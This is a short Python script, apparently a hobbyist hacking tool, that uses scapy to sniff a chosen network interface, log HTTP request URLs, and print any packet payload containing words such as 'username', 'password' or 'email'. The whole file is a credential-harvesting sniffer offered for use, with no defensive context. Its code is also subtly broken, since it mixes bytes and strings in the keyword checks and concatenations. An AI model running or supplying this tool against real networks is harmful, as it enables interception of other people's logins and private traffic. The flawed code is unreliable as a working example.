import scapy.all as scapy
import argparse
from scapy.layers import http



# What arguments could we take in here?

def fetch_args_matey():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface you want to sniff")
    args = parser.parse_args()
    return args

 
def sniff(iface):
    try:
        scapy.sniff(iface=iface, store=False, prn=process_packet)
    except Exception as e:
        print(f"Error: {e}")
        return None

def process_packet(packet):
    try:    
        if packet.haslayer(http.HTTPRequest):
            print("[+] HTTP Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
            if packet.haslayer(scapy.Raw):
                pkt = packet[scapy.Raw].load
                keys = ["Username", "username", "Password", "password", "pass", "email"]
                for key in keys:
                    if key in pkt:
                        print("[+] Possible username/password >> " + pkt)
    except Exception as e:
        print(f"Error: {e}")
        return None



if __name__ == '__main__':
    args = fetch_args_matey()
    iface = args.interface
    sniff(iface)




